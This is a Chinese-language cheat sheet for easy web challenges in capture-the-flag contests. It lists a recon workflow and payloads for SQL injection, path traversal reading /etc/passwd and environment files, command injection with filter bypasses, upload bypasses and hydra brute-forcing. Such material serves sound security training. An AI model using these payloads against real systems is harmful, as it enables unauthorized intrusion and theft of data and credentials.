# Web 速查（比赛版 · 简单题）

> 简单 Web 的题眼：**不是让你挖 0day，是让你别漏看东西**。
> 固定顺序走完，80% 的简单题就出来了。

---

## 0. 固定顺序（每题都这么走，别跳）

1. **端口/服务**：`nmap -sV -p- --min-rate 1000 目标`
2. **首页 + 源码 + 响应头**：`curl -i`；浏览器 F12 看注释
3. **目录/文件**：`gobuster` / `ffuf`（先跑常见清单）
4. **参数逐个动**：`?id=1` → `?id=1'` → `?id=1 and 1=1` → …
5. **定位漏洞类型**（见第 2~7 节）→ 用对应手法
6. **拿 flag**：常见在 `/flag`、数据库里、某个文件、环境变量

---

## 1. 侦察

```bash
nmap -sV -sC -p- 目标
whatweb http://目标
curl -i http://目标/
curl -s http://目标/ | grep -iE "<!--|flag|admin|todo"
gobuster dir -u http://目标 -w /usr/share/wordlists/dirb/common.txt -x php,txt,zip,bak
ffuf -u http://目标/FUZZ -w 清单.txt -mc 200,301,302,403
nikto -h http://目标
```

**必看清单**（比字典更值钱）：

```
robots.txt      .git/HEAD      .svn/entries
www.zip         backup.zip     index.php.bak
.index.php.swp  phpinfo.php    admin/  login  upload
```

## 2. SQL 注入

```bash
# 手工三问
?id=1'                  # 报错 → 有注入
?id=1 and 1=1 / and 1=2 # 页面有差别 → 布尔
?id=1 order by 3        # 列数
?id=-1 union select 1,2,3

# 工具
sqlmap -u "http://目标/?id=1" --batch --dbs
sqlmap -u "..." -D 库 -T 表 --dump
sqlmap -r req.txt --batch          # POST：抓包存成 req.txt
```
登录框：`admin' or 1=1 -- -`（注释符 `--` 后必须有空格或 `#`）。

## 3. 文件包含 / 任意文件读取

```bash
?file=../../../../etc/passwd
?file=../../../../flag
?file=php://filter/convert.base64-encode/resource=index.php
?file=/proc/self/environ
```
Windows 目标：`?file=..\..\..\..\windows\win.ini`。

## 4. 命令注入

```bash
;id      |id      ||id      `id`      $(id)
%0aid                              # URL 里换行符当分隔
${IFS}                             # 绕过空格
i''d    /bin/ca\t                  # 绕过关键字
;sleep 5                           # 盲注判据
```

## 5. 文件上传

- `Content-Type: image/png`
- 后缀：`.php .php5 .phtml .pHp .php.jpg .php%00.jpg`
- 魔术字节：`GIF89a` + `<?php ... ?>`
- 有解析配置时：`.htaccess` / `.user.ini`
- **上传后一定要访问它**，看响应里的真实文件名/路径

## 6. 弱口令 / 爆破

```bash
# 先猜：admin/admin admin/123456 test/test guest/guest
hydra -l admin -P pass.txt 目标 http-post-form "/login:u=^USER^&p=^PASS^:F=incorrect"
```
（简单题经常就是 `admin/admin`，别一上来就爆。）

## 7. 其他常见（看到关键词就试）

| 关键词 | 试什么 |
|---|---|
| `{{7*7}}` / `${7*7}` | SSTI → 49 |
| 有 url 参数 | SSRF：`?url=http://127.0.0.1/` |
| XML 输入 | XXE |
| 有 `.git` | `wget -r http://目标/.git/` 或 git-dumper |
| 下载/预览接口 | 任意文件读 |
| 反序列化提示 | `phpggc` / ysoserial（简单题少） |

## 8. 工具参数速查

```bash
sqlmap   --batch --dbs --tables --dump -r req.txt --level 3 --risk 2
gobuster dir -u URL -w 字典 -x php,txt -t 50
ffuf     -u URL/FUZZ -w 字典 -mc 200,301 -fs 大小
curl     -i -L -k -X POST -d "a=1" -b "k=v" -o 文件
```

## 9. 提交前

- flag 格式照抄（大小写、花括号）
- 记下 flag 从哪来（复盘要用）
- 时间不够就先交，别纠结原理
